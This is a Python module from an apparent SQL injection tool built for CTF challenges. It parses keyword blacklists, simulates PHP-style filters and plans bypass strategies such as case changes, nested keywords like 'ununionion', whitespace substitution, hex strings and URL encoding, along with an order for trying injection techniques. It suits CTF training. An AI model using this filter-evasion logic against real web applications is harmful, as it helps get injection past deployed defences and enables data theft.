# -*- coding: utf-8 -*-
"""Blacklist awareness layer (WAF / CTF filter bypass)

The most common class of protection in CTF looks like this:

    $blacklist = ['union', 'sleep', 'extractvalue', '--', '#', '/*', '*/', ...];
    foreach ($blacklist as $b) {
        if (stripos($in, $b) !== false) die('Hacker!');   // presence type: reject on match
        $in = str_replace($b, '', $in);                   // strip type: delete on match
    }
    // a few also loop to delete recursively

So "how to bypass" depends entirely on the filter semantics:

  ┌──────────────┬──────────────────────────────────────────────┐
  │ semantics    │ effective bypass                             │
  ├──────────────┼──────────────────────────────────────────────┤
  │ presence(case-sensitive) | just switch the keyword to uppercase UNION (PHP function/keyword names are case-insensitive)│
  │ presence(case-insensitive) | keyword is simply unusable → change the approach (SLEEP→heavy query/full-table cartesian) │
  │ strip single(case-insensitive) | nest the keyword ununionion → one deletion leaves exactly union │
  │ strip recursive | same as above is ineffective → change the approach │
  └──────────────┴──────────────────────────────────────────────┘

This module handles three things:
  1. Parse the blacklist file (Python list literal / line-by-line / comma-separated)
  2. Determine which blocked tokens a payload matches
  3. Plan a set of "candidate bypass strategies" for engine to try one by one (whether a strategy works is decided by the target's actual response)

It also provides simulate_filter(), which reproduces the filter result offline locally with the same semantic model,
for selftest/ to verify "whether a bypassed payload is restored to its intended meaning after filtering".
"""
import os
import re

# Common comment tokens (if blocked, the payload must be written in comment-free form)
COMMENT_TOKENS = {"--", "#", "/*", "*/", "-- ", "# ", ";"}
# Whitespace tokens
SPACE_TOKENS = {" ", "\t", "\n", "%20", "+", "\\s"}


# ----------------------------------------------------------------------
# File parsing
# ----------------------------------------------------------------------
_QUOTED = re.compile(r"""['"]([^'"]*)['"]""")


def parse_blacklist_text(text):
    """Extract blocked tokens from arbitrary text.

    Prefer detecting a list literal (['union', 'sleep', ...]): **only take the quoted strings inside that list**,
    so extra Chinese comments in the file (which may themselves contain quotes) are not mistaken for tokens.
    Only if no list is found does it fall back to whole-text quoted strings / line-by-line / comma-separated plain-text mode.
    """
    text = text or ""

    # 1) list literal: prefer the [] after BLACKLIST/blacklist, otherwise take the first []
    m = re.search(r"black\s*list[^\[]*\[(.*?)\]", text, re.DOTALL | re.IGNORECASE)
    if not m:
        m = re.search(r"\[(.*?)\]", text, re.DOTALL)
    if m:
        out, seen = [], set()
        for t in _QUOTED.findall(m.group(1)):
            if t and t not in seen:
                seen.add(t)
                out.append(t)
        if out:
            return out

    # 2) whole-text quoted strings (covers the ['a', "b"] style)
    tokens = []
    seen = set()
    for m in _QUOTED.finditer(text):
        t = m.group(1)
        if t == "":
            continue
        if t not in seen:
            seen.add(t)
            tokens.append(t)

    if tokens:
        return tokens

    # 3) plain text: by line and by comma (# onward is treated as a comment)
    for line in text.splitlines():
        line = line.split("#", 1)[0].strip()
        if not line:
            continue
        for part in line.split(","):
            p = part.strip().strip("'\"")
            if p and p not in seen:
                seen.add(p)
                tokens.append(p)
    return tokens


def load_blacklist(path):
    """Load the blacklist token list from a file."""
    if not path:
        return []
    if not os.path.exists(path):
        raise FileNotFoundError(f"Blacklist file does not exist: {path}")
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        return parse_blacklist_text(f.read())


# ----------------------------------------------------------------------
# Blacklist object
# ----------------------------------------------------------------------
class Blacklist:
    """A set of blocked tokens, providing match queries and semantic inference."""

    def __init__(self, tokens=None, source=None, mode="auto"):
        self.source = source
        self.mode = mode          # auto / presence / strip / strip-recursive
        self.tokens = list(tokens or [])
        # Order-preserving deduplication
        _seen, _uniq = set(), []
        for t in self.tokens:
            if t and t not in _seen:
                _seen.add(t)
                _uniq.append(t)
        self.tokens = _uniq
        self._lower = [(t, t.lower()) for t in self.tokens]

    # ---- Match queries ----
    def match(self, payload):
        """Return the list of blocked tokens matched in the payload (case-insensitive substring)."""
        if not payload:
            return []
        low = payload.lower()
        return [t for t, tl in self._lower if tl in low]

    def is_blocked(self, payload):
        return bool(self.match(payload))

    # ---- Semantic/feature inference ----
    @property
    def comments_blocked(self):
        return bool(set(t.strip().lower() for t in self.tokens) & COMMENT_TOKENS)

    @property
    def space_blocked(self):
        norm = set(t.strip().lower() for t in self.tokens)
        return bool(norm & SPACE_TOKENS) or "\\s" in norm

    def blocked(self, name):
        """Whether a given token is blocked (case-insensitive)."""
        n = name.lower()
        return any(tl == n for _, tl in self._lower)

    def has_word(self, words):
        """Given several keywords, whether at least one is blocked."""
        ws = {w.lower() for w in words}
        return bool({tl for _, tl in self._lower} & ws)

    def describe(self):
        lines = [f"  Blocked tokens: {len(self.tokens)}"]
        if self.tokens:
            lines.append("  " + ", ".join(repr(t) for t in self.tokens))
        if self.comments_blocked:
            lines.append("  [!] Comment tokens blocked → payload must be in comment-free form")
        if self.space_blocked:
            lines.append("  [!] Whitespace blocked → must use whitespace-substitution form")
        return "\n".join(lines)


# ----------------------------------------------------------------------
# Filter semantics simulation (for offline verification)
# ----------------------------------------------------------------------
PRESENCE_I = "presence_i"        # stripos: die on match (case-insensitive)
PRESENCE_CS = "presence_cs"      # strpos: die on match (case-sensitive)
STRIP_SINGLE_I = "strip_single_i"    # str_ireplace / preg_replace, single pass
STRIP_SINGLE_CS = "strip_single_cs"  # str_replace, single pass (case-sensitive)
STRIP_RECURSIVE_I = "strip_recursive_i"  # while recursive deletion

ALL_MODELS = [PRESENCE_I, PRESENCE_CS, STRIP_SINGLE_I,
              STRIP_SINGLE_CS, STRIP_RECURSIVE_I]

MODEL_LABEL = {
    PRESENCE_I: "presence(i)  reject on match",
    PRESENCE_CS: "presence(cs) reject on match",
    STRIP_SINGLE_I: "strip(single,i)  remove once",
    STRIP_SINGLE_CS: "strip(single,cs) remove once",
    STRIP_RECURSIVE_I: "strip(recursive,i)  remove until clean",
}


def simulate_filter(payload, tokens, model):
    """Simulate WAF processing according to the given semantic model.

    Returns (allowed, result):
      allowed=False means the request would be rejected (presence match);
      result is the filtered string (strip type deletes matched tokens).
    """
    if not payload:
        return True, payload
    toks = [t for t in tokens if t]

    if model == PRESENCE_I:
        low = payload.lower()
        return (not any(t.lower() in low for t in toks)), payload

    if model == PRESENCE_CS:
        return (not any(t in payload for t in toks)), payload

    if model in (STRIP_SINGLE_I, STRIP_SINGLE_CS, STRIP_RECURSIVE_I):
        case_i = model != STRIP_SINGLE_CS
        out = payload
        if model == STRIP_RECURSIVE_I:
            prev = None
            while prev != out:
                prev = out
                for t in toks:
                    out = _ireplace(out, t, "") if case_i else out.replace(t, "")
            return True, out
        for t in toks:
            out = _ireplace(out, t, "") if case_i else out.replace(t, "")
        return True, out

    return True, payload


def _ireplace(s, old, new):
    """Case-insensitive replacement (the rest is kept as-is)."""
    if not old:
        return s
    return re.sub(re.escape(old), new, s, flags=re.IGNORECASE)


# ----------------------------------------------------------------------
# Strategy
# ----------------------------------------------------------------------
class Strategy:
    """A candidate bypass scheme composed of a set of tampers."""

    def __init__(self, name, tampers, note=""):
        self.name = name
        self.tampers = list(tampers or [])
        self.note = note

    def __repr__(self):
        return f"<Strategy {self.name}: {self.tampers or 'raw'}>"

    def chain_label(self):
        return " -> ".join(self.tampers) if self.tampers else "none (as-is)"


# ----------------------------------------------------------------------
# Strategy planning
# ----------------------------------------------------------------------
class Planner:
    """Infer candidate bypass strategies from the blacklist and adjust technique priority."""

    def __init__(self, blacklist):
        self.bl = blacklist

    # ---- Strategy list (sorted from low to high cost; engine tests each one)----
    def strategies(self):
        bl = self.bl
        mode = (getattr(bl, "mode", "auto") or "auto").lower()
        out = [Strategy("raw", [], "no tamper at all (some lab ranges do not actually enforce filtering)")]

        word_tokens = [t for t in bl.tokens if re.fullmatch(r"[A-Za-z_]{2,}", t)]

        # Case-sensitive filtering → just change the case
        out.append(Strategy("case", ["randomcase"], "case obfuscation, bypasses case-sensitive filtering"))
        out.append(Strategy("lower", ["lowercase"], "all lowercase, bypasses implementations that only check an uppercase blacklist"))

        # Keyword nesting → bypasses "single deletion" filters
        # under presence / recursive deletion types nesting is pointless; skipped as hinted
        nest_useful = not mode.startswith("presence") and "recursive" not in mode
        if word_tokens and nest_useful:
            out.append(Strategy("nest", ["keyword_nest"],
                                "keyword nesting (ununionion), bypasses single replacement"))
            out.append(Strategy("nest+blank", ["keyword_nest", "space_alt"],
                                "nesting + whitespace substitution"))

        # Pure whitespace problem
        if bl.space_blocked:
            out.append(Strategy("blank", ["space_alt"], "whitespace substitution (real control characters)"))

        # Change the approach: reduce keyword surface + hex strings (evade quote/keyword scanning)
        out.append(Strategy("alt", ["logic_alt", "hex_string"],
                            "change the approach: AND→&&, =→LIKE, strings→0x hex"))
        if word_tokens and nest_useful:
            out.append(Strategy("nest+alt", ["keyword_nest", "logic_alt"],
                                "nesting + change the approach"))

        # Encoding class: only meaningful when % is not blocked (a % in the blacklist is rare)
        out.append(Strategy("charencode", ["charencode"], "whole-string URL encoding (requires raw sending)"))

        # Deduplicate (by tamper sequence)
        seen, uniq = set(), []
        for s in out:
            key = tuple(s.tampers)
            if key in seen:
                continue
            seen.add(key)
            uniq.append(s)

        # under strip (non-recursive) type, move the nesting strategy to the front (highest hit rate)
        if nest_useful and mode.startswith("strip"):
            uniq.sort(key=lambda s: 0 if "keyword_nest" in s.tampers else 1)
        return uniq

    # ---- Technique priority ----
    def technique_order(self, pref="auto"):
        """Return the technique attempt order. When a keyword is blocked, the corresponding technique is demoted but not excluded
        (because nesting/changing the approach may still recover it)."""
        if pref and pref != "auto":
            return [pref.upper()]

        order = ["U", "E", "B", "T"]

        def demote(code):
            if code in order:
                order.remove(code)
                order.append(code)

        if self.bl.blocked("union"):
            demote("U")            # union blocked → try others first
        if self.bl.has_word(["extractvalue", "updatexml"]):
            demote("E") if False else None  # error-based has other functions too; hint only
        if self.bl.has_word(["sleep", "benchmark"]):
            demote("T")            # delay function blocked → time-based blind injection must rely on heavy queries, high cost
        # Boolean is always the fallback, ensuring it is not pushed too far back by the previous two
        return order


def build_blacklist(path=None, tokens=None):
    """Convenience constructor: choose one of two."""
    if tokens:
        return Blacklist(tokens)
    if path:
        return Blacklist(load_blacklist(path), source=path)
    return Blacklist([])
